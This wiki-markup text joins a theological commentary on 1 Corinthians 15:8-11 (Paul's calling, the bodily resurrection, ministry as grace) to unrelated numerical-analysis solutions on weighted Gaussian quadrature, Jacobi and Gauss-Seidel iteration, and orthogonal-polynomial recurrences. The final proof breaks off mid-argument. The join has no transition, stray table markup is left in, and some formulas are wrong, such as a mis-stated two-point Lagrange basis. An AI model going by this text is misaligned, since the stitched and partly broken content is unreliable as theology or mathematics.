It is highly probable that Paul here is indeed referring to his calling experience, as that interpretation best serves to support that which follows. But what sort of nature is Paul referring to? That of a stillborn child that has no possibility of life apart from some sort of divine intervention. Paul, in recollecting his personal experience of the resurrected Christ, shows a sort of absolute disgust with the state in which he existed prior to it. He ''persecuted the church''. Paul was altogether hopeless in his wretchedness--as full of life and potential as an aborted or miscarried fetus.&lt;ref&gt;Garland, 693.&lt;/ref&gt; As noted by Thiselton, who ultimately takes this side, Paul's focus in this statement is not on himself, but rather on the grace of God, &quot;who chooses to give life and new creation to those reckoned as dead, or, in Paul's case, both a miscarried, aborted foetus whose stance had been ''hostile'' to Christ and to the new people of God.&quot;&lt;ref&gt;Thiselton, 1208.&lt;/ref&gt;

Thiselton in the above quote hints at the possible connection between verse eight and the previous creed. The pattern of the creed is death, finalized by burial, then life, enacted by God and witnessed by the church. Here, too, Paul gives a pattern: death (although technically still alive), with no hope of life to be found, then life, enacted by God and laboring for the church as an apostle. The pattern is strikingly similar.

'''Verse nine''' continues Paul's discourse on Christ's gracious calling. Paul puts it quite plainly: the apostolic position he holds now has nothing to do with anything he earned. He is the least of all the apostles. Fee, here, seems to misunderstand the nature of Paul's statement here. Due to his belief that Paul is defending his apostolic status to his critics, he believes that Paul says this to assert that, although Paul is the least of the apostles, he still ''is'' an apostle.&lt;ref&gt;Fee, 734.&lt;/ref&gt; But this interpretation seems inadequate; this section of verses does not at all sound remotely like a stern lecture on why his position must be respected. Rather, as previously noted, it seems his focus is entirely on the power of God's grace though the resurrection.

Verses 8-9 show Paul's belief in his absolute inadequacy to be who he is. He was hopelessly and miserably lost. If ever there was a soul who would gladly sing the old church hymn, it would be Paul:

&lt;blockquote&gt;
Amazing Grace! How sweet the sound,
that saved a wretch [i.e. an abortion] like me!
I once was lost but now am found,
was blind but now I see.
&lt;/blockquote&gt;

Paul was not worthy--he persecuted the church of God. The word he uses here for &quot;church&quot; is εκκλησίαν, which has two roots: εκ (a preposition connoting motion outward) and καλέω (a verb, meaning &quot;to call&quot;).&lt;ref&gt;Danker, 303.&lt;/ref&gt; It is important to see in this that Paul, talking about his persecution of the &quot;called out ones of God,&quot; is not speaking of the church as an organizational institution as it is commonly thought to mean today. Rather, Paul is talking about the very gathering of ''people''--the very ones for whom God has given him a deep love--who he persecuted. The gravity of this verse, combined with the graphic visual image in verse eight, is heavy enough to bear down even the strongest of constitutions. This is the very depth of death Paul is referring to when he speaks of death, which can still be had in the course of biological life.

This somber dirge, however, changes to a triumphant anthem, however, in '''verse ten''. This verse is powerful and one can imagine the force with which Paul utters these words: &quot;But by the grace of God I am what I am, and his grace unto me has not come to be fruitless...&quot; Paul, here, rises out of the depths of death and is able to speak of his abundant life he now has in Christ.

It needs to be noted that Paul does ''not'' say in this verse &quot;I am who I am,&quot; which would reflect God's work on Paul's character and personality. Instead, what Paul has to say is far more profound; he uses the neuter relative pronoun ό, which makes the translated phase say &quot;I am ''what'' I am.&quot; Paul is not just referring to the characteristics of his humanity, but rather whole nature and status as a being. The juxtaposition Paul provides is not between &quot;the worse me&quot; and &quot;a better me,&quot; but rather between two different beings: the first an abortion, unable to live, hopelessly lost to God, persecuting the people of God, and the second an ''apostle'' of the church who has labored for the church more than all the rest. It is no between &quot;the worse me&quot; and &quot;a better me,&quot; but rather &quot;the old self&quot; and the &quot;new creation.&quot; And, as is significant contextually, this transformation was triggered by ''the resurrection appearance of the Christ to Paul''.

As a side note, it must be said that in Paul asserting that he has labored more than all the rest of the apostles, he is ''not'' asserting himself over anyone. Rather, it is necessary for Paul to be able to point to the actual fruit of God's grace in his life--not to show how great he is, but rather the limitless greatness of God's grace. Thus Paul, always careful to ''only'' &quot;boast in the Lord,&quot; immediately clarifies the source of the his surpassing labors: God's grace.

Paul's point in what seems to be a very personal digression is actually Paul's final witness of the resurrection. The Corinthians have heard the creed. There is an abundance of witnesses in the Church who can attest to its historicity. And lastly, Paul can say that he did indeed also see the resurrected Christ. And if they don't believe his testimony, all they need to do is look at his history; in the timeline of Paul's life, there is a definite point in it where the course of Paul's life is radically changed, to move him in such a radically different direction in his life that it would take something as drastic as the bodily appearance of the resurrected Christ to have caused it. Indeed, the Corinthian church owes its very existence to this resurrection event, as Paul &quot;planted&quot; the community (see 3:6).

It is on this note that Paul concludes in '''verse eleven''' his foundation upon which his following argument will be built. Paul's statement in this verse is concluding in nature due to the presence of ούν, which means &quot;therefore&quot; and which functions to gather the preceding information and tie it together to introduce a result or inference.&lt;ref&gt;Danker, 736.&lt;/ref&gt; This coordinating conjunction, then, refers to the preceding material, most likely vv. 3-10, and ushers in the conclusion: Regardless of where they look within the church, the bodily resurrection of Christ can be witnessed in the gospel message, via the witness of the apostles, and in Paul's very life. Therefore, wherever they go, if the Corinthian church is at all Christian, then the resurrection of Christ is something they must absolutely embrace.

===Implications===

====Reception====

=====Were Christ's Resurrection Appearances Physical or Visionary in Nature?=====

As noted above regarding '''vv. 5-7''', there is much debate as to the nature of the resurrection. Some of the debate of both sides has already been mentioned, but further comment is necessary. The primary support given to the side that argues the text does ''not'' refer to a ''bodily'' resurrection is the word ώφθη, which is frequently used in Jewish sources to refer technically to divine manifestations that were rarely, if ever, physical in nature.

There is indeed a hole in this reasoning however: Paul's audience. The Corinthian church was mainly Gentile in nature. Paul making use of a term that would only be familiar to a Jewish audience to describe a divine, visionary manifestation in order to communicate with Greeks who had had little to no exposure to the Septuagint would poor contextualization on Paul's part. Considering Paul's calling and life profession was in living as a missionary to the gentiles, such poor a choice of words would seem unlike him.

Furthermore, when the word ώφθη is translated literally, without further assumptions of background meaning, the word means &quot;was seen.&quot; Fee points out that this is pivotal to Paul's argument. If the resurrection was spiritual in nature only, Paul would have no basis for arguing for the bodily resurrection of believers in the following section of text.&lt;ref&gt;Fee, 728&lt;/ref&gt; It would make little sense. Instead, to take the word literally implies the use of eyes to physically see the Christ. Thisleton further removes credibility from this argument by noting that Romans 15:21 contrasts seeing with the eyes (making use of όψονται, which is a variation of ώφθη) and seeing with the mind/understanding (which uses a completely different verb).&lt;ref&gt;Thiselton, 1198.&lt;/ref&gt;

While proper credence should be given to the arguments of those who oppose an interpretation of bodily resurrection, it appears as if such arguments are driven more by post-historical-critical existentialist biases. The opponents seem to not believe in an objective resurrection, and thus interpret Scripture as such, choosing instead to find a subjective meaning and truth for life in the idea of the resurrection. Thiselton cites two notable figures who fall into these categories. The first is W. Marxsen, who he describes as saying:

&lt;blockquote&gt;
...we must abandon talk about &quot;an objective vision&quot;; or at least accept that the weight is placed on &quot;the subjectivity...of my own faith,&quot; although certainly with the fundamental proviso that for Paul (or Peter) &quot;the impulse to faith came from outside himself.&quot;&lt;ref&gt;Thiselton, 1200.&lt;/ref&gt;
&lt;/blockquote&gt;

The second figure Thiselton cites is Rudolf Bultmann, who went even farther and asserted that &quot;belief in the resurrection is 'the same thing as faith in the saving efficacy of the cross.'&quot;&lt;ref&gt;Thiselton, 1201.&lt;/ref&gt;

As noted earlier, however, these things ''cannot'' be Paul's argument here in the text, as that would have destroyed Paul's point, not assisted it.

Furthermore, it is relevant to note four points that theologian Wolfhart Pannenberg makes to fend of solely existential interpretations of the resurrection. He asserts that it is intellectually credible--indeed, more credible--to believe in the bodily resurrection of the Christ:

# The early Christian witness could not have been nearly as successful as it was if Christ's body was still within the tomb while they were preaching his resurrection. Thus it is necessary to assume that the tomb was indeed empty.
# The empty tomb, by itself, could be explained in other ways that would not necessitate resurrection. Perhaps this is why Paul does not once refer to an empty tomb.
# When premises 1 and 2 are combined, it is difficult to assume that so many witnesses were merely hallucinating.
# To assert that an event took place between burial and the visit of the women to the empty tomb is a ''historical'' claim and can thus be tested and analyzed. Thus, based upon the biblical witness, one cannot come to a solely existential conclusion regarding the meaning of the resurrection.&lt;ref&gt;Thiselton, 1197-1198.&lt;/ref&gt;

Therefore, based upon this evaluation, it seems nearly impossible for one to deny Christ's bodily resurrection. As Tertullian puts it in a discourse against Marcion:

&lt;blockquote&gt;
For just as they, who said that there is no resurrection of the dead, are refuted by the apostle from the resurrection of Christ, so, if the resurrection of Christ falls to the ground, the resurrection of the dead is also swept away. And so our faith is in vain, and vain also is the preaching of the apostles. Moreover, they even show themselves to be false witnesses of God, because they testified that he raised up Christ, whom he did not raise. And we remain in our sins still. And those who have slept in Christ have perished; destined, forsooth, to rise again, but peradventure in a phantom state, just like Christ.&lt;ref&gt;Tertullian. ''The Five Books Against Marcion.'' The Ante-Nicene Fathers. S. Thelwall, Trans. Alexander Roberts and James Donaldson, Eds. Vol. 3. Version 2.0. (Public Domain), 3:8. ''Accordance Bible Software''. OakTree Software, inc. Version 8.2.2. Mar. 2009.&lt;/ref&gt;
&lt;/blockquote&gt;

Of particular note in this quote by the great church patriarch, the resurrection of Christ is especially relevant for how one lives life as a Christian (if one could even be a Christian without Christ's resurrection). He seems to say that without the new life that is only provided by Christ's resurrection, we cannot possibly be new creations--&quot;we remain in our sins still.&quot; If Christ was not actually resurrected, then Paul is still an εκτρώμα, an aborted fetus. But this certainly does not explain the radical change in Paul's life. In short, without Christ's resurrection in reality, ''in history'', the church has no purpose and the Christian faith is simply a philosophy.

=====Paul's Ministry as a Relevant Paradigm for Today=====

There can be no doubt that &quot;grace&quot; is an important theme in Paul's writings. This should be understood as having particular relevance to the way in which ministers today go about their &quot;labors.&quot; Paul's description of his apostolate here, then, needs to be a paradigmatic understanding as part of any minister's philosophy of ministry.

This emulation of Paul's ministry--even language--is not a new notion in the church. Indeed, Ignatius in his epistle to Rome has a phrase that is strikingly similar to what can be seen in '''vv. 8-10''':

&lt;blockquote&gt;
But as for me, I am ashamed to be counted one of them; for indeed I am not worthy, as being the vary last of them, and one born out of due time. But I have obtained mercy to be somebody, if I shall attain to God.&lt;ref&gt;Ignatius. &quot;The Epistle of Ignatius to the Romans.&quot; ''The Apostolic Fathers With Justin Martyr and Irenaeus.'' The Ante-Nicene Fathers. Alexander Roberts and James Donaldson, Eds. Vol. 1. Version 2.0. (Public Domain), 10. ''Accordance Bible Software''. OakTree Software, inc. Version 8.2.2. Mar. 2009.&lt;/ref&gt;
&lt;/blockquote&gt;

It is highly unlikely that this quotation is coincidentally similar to Paul's description of his own calling in vv. 8-10. Ignatius seems to be drawing from the Pauline wellspring for guidance as to how to be a minister.

But what exactly can we learn from Paul's description here? Perhaps most important verse is '''verse ten''': &quot;But by the grace of God I am what I am, and his grace unto me has not come to be fruitless; Rather, I toiled harder than all of them, yet it was not I but the grace of God working with me.&quot; 

If one is to take the biblical doctrine of the &quot;new creation&quot; seriously--that there an ontological transformation (otherwise known as sanctification) in the regenerate (born again) Christian--then one must always acknowledge the true source of new life: the salvific work of Jesus Christ. It is only by the grace of God--the very empowering presence of God--that both Paul and the church today can truly ''be'' the church, a &quot;nation of priests.&quot; Indeed, this grace was not earned--for that is contrary to the very nature of grace. Augustine describes it well: &quot;Paul did not labor in order to receive grace, but he received grace so that he might labor.&quot;&lt;ref&gt;Bray, 152.&lt;/ref&gt;

Beyond simply our very nature, our ministry needs to be understood in light of the grace of God. Paul does not once say that his actions stand apart unto themselves--the are only ever enabled by the grace of God working within him. Apart from this grace, he is nothing but an aborted fetus; with this grace, it is the greatest of apostles to whom the Church is indebted for his writings it has identified as Scripture. It is the same with our ministry--it is only by the grace of God that ministry is even possible.

===Find Orthogonal Polynomials w.r.t. Weighting Function===
For this problem, we need the first three orthogonal polynomials &lt;math&gt;P_1,P_2,\mbox{ and }P_3 \!\,&lt;/math&gt; with respect to a weighted inner product

:&lt;math&gt; \left \langle f,g \right \rangle = \int_{-1}^1 f(x)g(x)w(x) dx \!\,&lt;/math&gt;

where &lt;math&gt;w(x) = x^4 \!\,&lt;/math&gt; in our case. This can be done using Gram-Schmidt Orthogonalization on the basis &lt;math&gt;\left \{ 1,x,x^2,x^3 \right \} \!\,&lt;/math&gt; 

====Zero Order Polynomial====
Let &lt;math&gt;P_0(x) = 1 \!\,&lt;/math&gt;

====First Order Polynomial====
&lt;math&gt;
\begin{align}
P_1(x) &amp;= x - \frac{\left \langle 1,x \right \rangle}{\left \langle 1,1 \right \rangle}\cdot 1 \\
       &amp;= x - \underbrace{\frac{\int_{-1}^1 x^5 dx}{\int_{-1}^1 x^4 dx}}_{\frac{0}{2/5}}       \\
       &amp;= x
\end{align}
&lt;/math&gt;

====Second Order Polynomial====
&lt;math&gt;
\begin{align}
P_2(x) &amp;= x^2 - \frac{\left \langle 1,x^2 \right \rangle}{\left \langle 1,1 \right \rangle}\cdot 1 
              - \frac{\left \langle x,x^2 \right \rangle}{\left \langle x,x \right \rangle}\cdot x \\
       &amp;= x^2 - \frac{\int_{-1}^1 x^6 dx}{\int_{-1}^1 x^4 dx}
              - x \cdot \underbrace{\frac{\int_{-1}^1 x^7 dx}{\int_{-1}^1 x^6 dx}}_{\frac{0}{2/7}} \\
       &amp;= x^2 - \frac{5}{7}
\end{align}
&lt;/math&gt;

====Third Order Polynomial====
&lt;math&gt;
\begin{align}
P_3(x) &amp;= x^3 - \frac{\left \langle 1,x^3 \right \rangle}{\left \langle 1,1 \right \rangle}\cdot 1 
              - \frac{\left \langle x,x^3 \right \rangle}{\left \langle x,x \right \rangle}\cdot x 
              - \frac{\left \langle x^2 - \frac57,x^3 \right \rangle}{\left \langle x^2 - \frac{5}{7}, 
                x^2 - \frac{5}{7} \right \rangle}\cdot (x^2 - \frac{5}{7}) \\
       &amp;= x^3 - 0 - \frac72 x \cdot \frac{\int_{-1}^1 x^8 dx}{\int_{-1}^1 x^6 dx} - 0 \\
       &amp;= x^3 - \frac{7}{9} x
\end{align}
&lt;/math&gt;

====Find Roots of Polynomials====

The roots of these polynomials will be the interpolation nodes used in Gauss Quadrature.

&lt;math&gt; 
\begin{array}{|c|c|} \mbox{Polynomial} &amp; \mbox{Roots} \\
\hline
P_1(x) = x               &amp; 0\\ \\
P_2(x) = x^2 -\frac57    &amp; \pm \sqrt{\frac57}\\ \\
P_3(x) = x^3 -\frac79 x  &amp; 0, \pm \sqrt{\frac79}\\ \\
\hline
\end{array}
&lt;/math&gt;

===Formula to Compute Coefficients===

In Gaussian quadrature we have 

:&lt;math&gt;w_j = \int_{-1}^1 l_i(x)x^4 dx \!\,&lt;/math&gt;, where

:&lt;math&gt;l_i(x) = \prod_{j=1,j \ne i}^n \frac{x-x_j}{x_i-x_j} \!\,&lt;/math&gt;

====1 point formula====

&lt;math&gt; l_1(x) = 1 \!\,&lt;/math&gt;


&lt;math&gt;w_1 = \int_{-1}^1 x^4 dx = \frac25 \!\,&lt;/math&gt;



&lt;math&gt; \int_{-1}^1 f(x)x^4 dx \approx \frac25 f(x_1) \!\,&lt;/math&gt;

where &lt;math&gt;x_1 \!\,&lt;/math&gt; is the root of &lt;math&gt;P_1(x)\!\,&lt;/math&gt;.

====2 point formula====

&lt;math&gt; l_1(x) = \frac{x-x_1}{x_1-x_2} \!\,&lt;/math&gt;

&lt;math&gt; l_2(x) = \frac{x-x_1}{x_2-x_1} \!\,&lt;/math&gt;


&lt;math&gt; w_1 = \int_{-1}^1 \frac{x-x_1}{x_1-x_2} x^4 dx = \frac{2x_2}{5(x_2-x_1)} \!\,&lt;/math&gt;

&lt;math&gt; w_2 = \int_{-1}^1 \frac{x-x_1}{x_2-x_1} x^4 dx = \frac{2x_1}{5(x_1-x_2)} \!\,&lt;/math&gt;



&lt;math&gt; \int_{-1}^1 f(x)x^4 dx \approx w_1 f(x_1) + w_2 f(x_2) \!\,&lt;/math&gt;

where &lt;math&gt;x_1 \mbox{ and }x_2 \!\,&lt;/math&gt; are the roots of &lt;math&gt;P_2(x) \!\,&lt;/math&gt;.

====3 point formula====

&lt;math&gt; l_1(x) = \frac{x-x_2}{x_1-x_2} \frac{x-x_3}{x_1-x_3} \!\,&lt;/math&gt;

&lt;math&gt; l_2(x) = \frac{x-x_1}{x_2-x_1} \frac{x-x_3}{x_2-x_3} \!\,&lt;/math&gt;

&lt;math&gt; l_3(x) = \frac{x-x_1}{x_3-x_1} \frac{x-x_2}{x_3-x_2} \!\,&lt;/math&gt;


&lt;math&gt; w_1 = \int_{-1}^1 \frac{x-x_2}{x_1-x_2} \frac{x-x_3}{x_1-x_3} x^4 dx = \frac{1}{(x_1-x_2)(x_1-x_3)} \left( \frac27 + \frac{2x_2x_3}{5} \right) \!\,&lt;/math&gt;

&lt;math&gt; w_2 = \int_{-1}^1 \frac{x-x_1}{x_2-x_1} \frac{x-x_3}{x_2-x_3} x^4 dx = \frac{1}{(x_2-x_1)(x_2-x_3)} \left( \frac27 + \frac{2x_1x_3}{5} \right) \!\,&lt;/math&gt;

&lt;math&gt; w_3 = \int_{-1}^1 \frac{x-x_1}{x_3-x_1} \frac{x-x_2}{x_3-x_2} x^4 dx = \frac{1}{(x_3-x_1)(x_3-x_2)} \left( \frac27 + \frac{2x_1x_2}{5} \right) \!\,&lt;/math&gt;


&lt;math&gt; \int_{-1}^1 f(x)x^4 dx \approx w_1 f(x_1) + w_2 f(x_2) + w_3 f(x_3) \!\,&lt;/math&gt;

where &lt;math&gt;x_1 \mbox{, } x_2 \mbox{ and }x_3 \!\,&lt;/math&gt; are the roots of &lt;math&gt;P_3(x) \!\,&lt;/math&gt;.

===Derive Error Bound===
We know that this quadrature is exact for all polynomials  of degree at most &lt;math&gt;2n-1 \!\,&lt;/math&gt;. 


We choose a polynomial &lt;math&gt; p\!\,&lt;/math&gt; of degree at most &lt;math&gt;2n-1 \!\,&lt;/math&gt; that Hermite interpolates i.e.


&lt;math&gt;p(x_i)=f(x_i) \quad p'(x_i)=f'(x_i) \quad (0\leq i \leq n-1) \!\,&lt;/math&gt;


The error for this interpolation is 


&lt;math&gt;f(x)-p(x)=\frac{f^{(2n)}(\zeta(x))}{(2n)!} \prod_{i=0}^{n-1}(x-x_i)^2 \!\,&lt;/math&gt;


Compute the error of the quadrature as follows:


&lt;math&gt; 
\begin{align}
E &amp;= \int_{-1}^1 f(x)x^4dx - \sum_{i=0}^{n-1} w_i f(x_i) \\
  &amp;= \int_{-1}^1 f(x)x^4dx - \sum_{i=0}^{n-1} w_i p(x_i) \\
  &amp;= \int_{-1}^1 f(x)x^4dx - \int_{-1}^1  p(x) x^4 dx \\
  &amp;= \int_{-1}^1 (f(x)-p(x)) x^4dx  \\
  &amp;= \int_{-1}^1 \frac{f^{(2n)}(\zeta(x))}{(2n)!} \prod_{i=0}^{n-1}(x-x_i)^2 \cdot x^4 dx \\
  &amp;= \frac{f^{(2n)}(\xi)} {(2n)!} \int_{-1}^1  x^4 \cdot \underbrace{\prod_{i=0}^{n-1}(x-x_i)^2}_{(p_n(x))^2} dx
\end{align}
\!\,&lt;/math&gt;


where the last line follows from the mean value theorem of integrals.


Notice that &lt;math&gt;p_n(x)\!\,&lt;/math&gt; is simply the polynomials orthogonal with respect to weight function since &lt;math&gt; x_i\!\,&lt;/math&gt; are the roots of the polynomials.


Hence, the error for 1 point gaussian quadrature is


&lt;math&gt;
\begin{align}
E &amp;=  \frac{f^{(2)}(\xi)} {(2)!} \int_{-1}^1  x^4 \cdot x^2 dx \\
  &amp;= \frac{f^{(2)}(\xi)} {7} 
\end{align}
\!\,&lt;/math&gt;


The error for 2 point quadrature:


&lt;math&gt;
\begin{align}
E &amp;=  \frac{f^{(4)}(\xi)} {(4)!} \int_{-1}^1  x^4 \cdot (x^2-\frac57)^2 dx 
\end{align}
\!\,&lt;/math&gt;


The error for 3 point quadrature:


&lt;math&gt;
\begin{align}
E &amp;=  \frac{f^{(6)}(\xi)} {(6)!} \int_{-1}^1  x^4 \cdot (x^3-\frac79x)^2 dx 
\end{align}
\!\,&lt;/math&gt;

|}

==Solution 2==

===Jacobi Method===
Decompose &lt;math&gt;A \!\,&lt;/math&gt; into its diagonal, lower, and upper parts i.e.


&lt;math&gt;A=D+(L+U) \!\,&lt;/math&gt;


Derive Jacobi iteration by solving for x as follows:


&lt;math&gt; 
\begin{align}
Ax &amp; =b \\
(D+(L+U))x &amp;= b\\
Dx+(L+U)x  &amp;= b\\
Dx         &amp;= b-(L+U)x \\
         x &amp;= D^{-1}(b-(L+U)x)
\end{align}
\!\,&lt;/math&gt;

===Gauss-Seidel Method===
Decompose &lt;math&gt;A \!\,&lt;/math&gt; into its diagonal, lower, and upper parts i.e.


&lt;math&gt;A=(D+L)+U \!\,&lt;/math&gt;


Derive Gauss-Sediel iteration by solving for x as follows:


&lt;math&gt; 
\begin{align}
Ax &amp; =b \\
((D+L)+U)x &amp;= b\\
(D+L)x+Ux  &amp;= b\\
(D+L)x     &amp;= b-Ux \\
         x &amp;= (D+L)^{-1}(b-Ux)
\end{align}
\!\,&lt;/math&gt;

===Jacobi Convergence===
Convergence occurs for the Jacobi iteration if the spectral radius of &lt;math&gt; D^{-1}(L+U)\!\,&lt;/math&gt; is less than 1 i.e.


&lt;math&gt;\rho(D^{-1}(L+U)) &lt; 1 \!\,&lt;/math&gt;


The eigenvalues of the matrix 


&lt;math&gt;
D^{-1}(L+U) = 
\begin{bmatrix}
0 &amp; 1 &amp; -1 \\
\frac12 &amp; 0 &amp;\frac12 \\
1 &amp;  1 &amp;   0 
\end{bmatrix}
\!\,&lt;/math&gt;


are &lt;math&gt;\lambda=0,0,0 \!\,&lt;/math&gt; i.e. the eigenvalue &lt;math&gt; 0\!\,&lt;/math&gt; has order 3.


Therefore, the spectral radius is &lt;math&gt;\rho=0 &lt;1 \!\,&lt;/math&gt;.

===Gauss-Seidel Convergence===
Convergence occurs for the Gauss-Seidel iteration if the spectral radius of &lt;math&gt; (D+L)^{-1}U\!\,&lt;/math&gt; is less than 1 i.e.


&lt;math&gt;\rho((D+L)^{-1}U) &lt; 1 \!\,&lt;/math&gt;


The eigenvalues of the matrix 


&lt;math&gt;
(D+L)^{-1}U = 
\begin{bmatrix}
0 &amp; 1        &amp; -1 \\
0 &amp; -\frac12 &amp;  1 \\
0 &amp; -\frac12 &amp;  0 
\end{bmatrix}
\!\,&lt;/math&gt;


are &lt;math&gt;\lambda=0,-\frac14+\frac{\sqrt{7}i}{4},-\frac14-\frac{\sqrt{7}i}{4} \!\,&lt;/math&gt;

Therefore, the spectral radius is &lt;math&gt;\rho=\sqrt{\frac{1}{16}+\frac{7}{16}}=\frac{\sqrt{2}}{2} \approx .7 &lt;1 \!\,&lt;/math&gt;.

===Comparison of Methods===
In general, the Gauss-Seidel iteration converges faster than the Jacobi iteration since Gauss-Seidel uses the new components of &lt;math&gt; x_i \!\,&lt;/math&gt; as they become available, but in this case &lt;math&gt; \rho_{Jacobi} &lt; \rho_{Gauss-Seidel} \!\, &lt;/math&gt;, so the Jacobi iteration is faster.

:&lt;math&gt;\mbox{span}\left\{ p_0(x), p_1(x), \dots, p_n(x) \right\} = \mbox{span}\left\{ 1,x,x^2,\dots,x^n \right\}  \!\,&lt;/math&gt;  


|}

==Solution 3a==
We prove the claim by by induction.

===Base Case===
&lt;math&gt; p_0(x) = 1 \!\,&lt;/math&gt; is monic with degree zero, and &lt;math&gt;\mbox{span}\left\{ p_0(x) \right\} = \mbox{span}\left\{ 1 \right\} \!\,&lt;/math&gt;.


&lt;math&gt; p_1(x) = x-\mu_0 \!\,&lt;/math&gt; is monic with degree one, and &lt;math&gt;\mbox{span}\left\{ p_0(x), p_1(x) \right\} = \mbox{span}\left\{ 1,x \right\} \!\,&lt;/math&gt;.


&lt;math&gt; p_2(x) = (x-\mu_0)(x-\mu_1) - \nu_1^2 \!\,&lt;/math&gt; is monic with degree 2, and &lt;math&gt;\mbox{span}\left\{ p_0(x), p_1(x),p_2(x) \right\} = \mbox{span}\left\{ 1,x,x^2 \right\} \!\,&lt;/math&gt;.

===Induction Step===
Assume &lt;math&gt; p_{k-1}(x)\!\,&lt;/math&gt; is monic with degree &lt;math&gt;k-1 \!\,&lt;/math&gt;, and &lt;math&gt;\mbox{span}\left\{ p_0(x), p_1(x),\dots,p_{k-1}(x) \right\} = \mbox{span}\left\{ 1,x,\dots,x^{k-1} \right\} \!\,&lt;/math&gt;.


Also,assume &lt;math&gt; p_k(x) \!\,&lt;/math&gt;is monic with degree &lt;math&gt;k \!\,&lt;/math&gt;, and &lt;math&gt;\mbox{span}\left\{ p_0(x), p_1(x),\dots,p_{k}(x) \right\} = \mbox{span}\left\{ 1,x,\dots,x^{k} \right\} \!\,&lt;/math&gt;.


Then from the hypothesis, &lt;math&gt; p_{k+1}(x) = (x-\mu_k)p_k(x) - \nu_k^2p_{k-1}(x) \!\,&lt;/math&gt; is monic with degree &lt;math&gt;k+1 \!\,&lt;/math&gt;.


Also,


&lt;math&gt;\mbox{span}\left\{ p_0(x), p_1(x),\dots,p_{k+1}(x) \right\} = \mbox{span}\left\{ 1,x,\dots,x^{k+1} \right\} \!\,&lt;/math&gt; 


since &lt;math&gt;p_{k+1}(x) \!\,&lt;/math&gt; is just &lt;math&gt;x^{n+1} \!\,&lt;/math&gt; plus a linear combination of lower order terms already in &lt;math&gt; \mbox{span}\left\{ 1,x,\dots,x^{k} \right\} \!\,&lt;/math&gt;.

|}

==Solution 3b==

We prove the claim by induction.

===Base Case===

Let's consider the case &lt;math&gt;k=2 \!\,&lt;/math&gt;. We know that
 

&lt;math&gt; p_2(x)=(x-\mu_0)(x-\mu_1)-\nu_{1}^2. \!\,&lt;/math&gt;


The quadratic formula shows that &lt;math&gt;p_2(x)\!\,&lt;/math&gt; has two simple real roots. 


Let &lt;math&gt; r_{21} \!\,&lt;/math&gt; and &lt;math&gt; r_{22}\!\,&lt;/math&gt; be the zeros of &lt;math&gt;p_2(x)\!\,&lt;/math&gt;. Then, we have (because of sign changes) that


&lt;math&gt; p_2(\mu_0)=-\nu_1^2 \!\,&lt;/math&gt; and &lt;math&gt; \lim_{x \rightarrow \infty} p_2(x)&gt;0 \!\,&lt;/math&gt; &lt;math&gt; \Rightarrow \!\,&lt;/math&gt; there exists &lt;math&gt; r_{22} \in (\mu_0,\infty) \!\,&lt;/math&gt; such that &lt;math&gt;p_2(r_{22})=0\!\,&lt;/math&gt;.

&lt;math&gt; p_2(\mu_0)=-\nu_1^2 \!\,&lt;/math&gt; and &lt;math&gt; \lim_{x \rightarrow -\infty} p_2(x)&gt;0 \!\,&lt;/math&gt; &lt;math&gt; \Rightarrow \!\,&lt;/math&gt; there exists &lt;math&gt; r_{21} \in (-\infty,\mu_0) \!\,&lt;/math&gt; such that &lt;math&gt;p_2(r_{21})=0\!\,&lt;/math&gt;.


In conclusion, &lt;math&gt;  r_{21} &lt; \underbrace{\mu_0}_{r_{11}} &lt; r_{22}. \!\,&lt;/math&gt;.

===Induction Step===
Let  &lt;math&gt; r_{k-1,1}, \dots, r_{k-1,k-1}\!\,&lt;/math&gt; and &lt;math&gt; r_{k,1}, \dots, r_{k,k}\!\,&lt;/math&gt; be the simple real roots of &lt;math&gt; p_{k-1}(x)\!\,&lt;/math&gt; and &lt;math&gt; p_k(x)\!\,&lt;/math&gt;, respectively, such that the roots of &lt;math&gt; p_{k}\!\,&lt;/math&gt; are interlaced with the roots of &lt;math&gt; p_{k-1}\!\,&lt;/math&gt;, i.e.,


&lt;math&gt; r_{k,1} &lt; r_{k-1,1} &lt; r_{k,2} &lt; r_{k-1,2} &lt; \dots &lt; r_{k-1,k-1} &lt; r_{k,k}. \!\,&lt;/math&gt;


Then, we have that 


&lt;math&gt; p_{k+1}(r_{k,1})= (r_{k,1} -\mu_k) \underbrace{p_k(r_{k,1})}_0   -\nu_k^2 p_{k-1} (r_{k,1}) = -\nu_k^2 p_{k-1} (r_{k,1}),\!\,&lt;/math&gt;


&lt;math&gt; p_{k+1}(r_{k,2})= (r_{k,2} -\mu_k) \underbrace{p_k(r_{k,2})}_0   -\nu_k^2 p_{k-1} (r_{k,2}) = -\nu_k^2 p_{k-1} (r_{k,2}).\!\,&lt;/math&gt;


From the induction hypothesis &lt;math&gt; p_{k-1}(r_{k,1})\!\,&lt;/math&gt; and &lt;math&gt; p_{k-1}(r_{k,2})\!\,&lt;/math&gt; have different signs since &lt;math&gt; r_{k,1}&lt; r_{k-1,1} &lt; r_{k,2}\!\,&lt;/math&gt;. Then, there exists &lt;math&gt; r_{k+1,1} \in (r_{k,1},r_{k,2}) \!\,&lt;/math&gt;  such that &lt;math&gt; p_{k+1}(r_{k+1,1})=0\!\,&lt;/math&gt;. 


Proceeding in the same manner for all the intervals &lt;math&gt; (r_{k,j},r_{k,j+1}) \!\,&lt;/math&gt;, we obtain that there exists &lt;math&gt; r_{k+1,j} \in (r_{k,j},r_{k,j+1}) \!\,&lt;/math&gt; such that &lt;math&gt; p_{k+1}(r_{k+1,j})=0\!\,&lt;/math&gt; for &lt;math&gt; j=1,\dots,k-1.\!\,&lt;/math&gt;


We now consider the smallest and largest roots of &lt;math&gt;p_{k+1}\!\,&lt;/math&gt; i.e. &lt;math&gt;r_{k+1,0}, r_{k+1,k+1} \!\,&lt;/math&gt;


Since for &lt;math&gt;k=0,1,2,\ldots \!\,&lt;/math&gt;, &lt;math&gt;p_k \!\,&lt;/math&gt; is a monic polynomial, 


&lt;math&gt;\lim_{x \rightarrow \infty} p_k(x) = \infty \!\,&lt;/math&gt;


Hence for any &lt;math&gt;x &gt; r_k \!\,&lt;/math&gt; (any &lt;math&gt; x\!\,&lt;/math&gt; larger than the largest root of &lt;math&gt; p_k \!\,&lt;/math&gt;)


&lt;math&gt;p_k(x) &gt; 0 \!\,&lt;/math&gt;


Therefore


&lt;math&gt; \lim_{x \rightarrow \infty} p_{k+1}(x)&gt;0 \!\,&lt;/math&gt; and &lt;math&gt; p_{k+1}(r_{k,k})= -\nu_k^2 p_{k-1} (r_{k,k}) &lt; 0,\!\,&lt;/math&gt; 


